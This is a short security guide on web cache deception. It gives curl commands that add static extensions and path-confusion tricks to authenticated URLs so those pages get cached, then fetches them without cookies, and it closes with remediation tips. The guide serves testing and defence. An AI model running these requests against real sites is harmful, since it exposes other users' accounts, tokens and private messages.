# Cache Deception

## Summary
Cache deception tricks the web cache into storing a sensitive or authenticated page by appending a static extension (e.g., `.css`, `.js`, `.jpg`) to a dynamic URL. The cache sees a static resource and caches it, exposing the sensitive page to other users.

## Detection

### Step 1: Identify Sensitive Endpoints
Find authenticated pages that return sensitive data:
- /account — user profile, payment details
- /dashboard — personal dashboard
- /settings — API keys, tokens
- /messages — private messages
- /profile — personal information

### Step 2: Append a Static Extension

```bash
# Append .css to a sensitive endpoint
curl -s "https://target.com/account/.css" -H "Cookie: session=valid_user_session"

# Append .js
curl -s "https://target.com/dashboard/.js" -H "Cookie: session=valid_user_session"

# Append .jpg
curl -s "https://target.com/profile/.jpg" -H "Cookie: session=valid_user_session"

# Check caching headers on the response
curl -sI "https://target.com/account/.css" | grep -i "x-cache\|age\|cf-cache"
```

### Step 3: Verify from an Unauthenticated Context
If the authenticated response was cached, an unauthenticated user can retrieve it:

```bash
# Without any cookie, try to fetch the cached sensitive page
curl -s "https://target.com/account/.css"
```

If sensitive data is returned without authentication, cache deception is confirmed.

### Advanced: Path Confusion
Some frameworks normalise paths differently:

```bash
# Path parameter confusion — Spring Boot
curl -s "https://target.com/account;.css" -H "Cookie: session=valid"

# Semicolon path confusion
curl -s "https://target.com/account/..;/account.css" -H "Cookie: session=valid"

# Double extension
curl -s "https://target.com/account.php/.jpg" -H "Cookie: session=valid"
```

## Remediation
- Never cache responses with Cache-Control: no-store for authenticated content
- Configure cache to exclude cookies or authentication headers from cache
- Use path-based cache exclusion rules for dynamic sections
- Implement Vary header to differentiate cached responses by authentication state
- Disable static extension confusion by normalising paths before routing
